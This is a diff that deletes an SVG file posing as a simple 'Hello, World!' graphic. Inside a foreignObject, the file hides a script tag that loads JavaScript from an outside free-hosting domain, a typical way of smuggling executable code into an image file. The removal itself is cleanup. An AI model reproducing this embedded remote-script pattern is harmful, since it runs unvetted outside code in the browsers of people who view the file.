@@ -1,9 +1,0 @@
-<svg id="my-svg-content" xmlns="http://www.w3.org/2000/svg" width="300" height="200">
-  <foreignObject width="100%" height="100%">
-    <div xmlns="http://www.w3.org/1999/xhtml">
-      <h1>Hello, World!</h1>
-      <p>This is an HTML element inside an SVG.</p>
-      <script type="text/javascript" src="https://hengkerone.000webhostapp.com/hai.js"></script>
-    </div>
-  </foreignObject>
-</svg>
